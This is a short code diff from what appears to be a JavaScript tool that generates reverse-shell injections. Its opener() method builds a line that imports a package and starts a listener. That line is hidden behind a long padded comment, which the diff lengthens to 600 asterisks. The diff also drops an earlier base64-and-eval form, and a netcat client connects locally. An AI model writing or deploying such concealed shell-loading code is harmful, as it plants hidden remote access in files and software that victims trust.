@@ -22,12 +22,9 @@ export default ReverseShell`;
 	}
 
 	opener(pkg) {
-		const code = `import M from '${pkg}'
-const Listener = new M()
-Listener.start()`;
-		const encoded_code = Buffer.from(code).toString('base64');
+		const code = `;import M from '${pkg}';const Listener = new M();Listener.start()`;
 		return `
-        /${'*'.repeat(100)}*/;eval(Buffer.from('${encoded_code}', 'base64').toString('ascii'))\n`;
+        /${'*'.repeat(600)}*/${code}\n`;
 	}
 	runLocalClient() {
 		const client = new netcat.client();
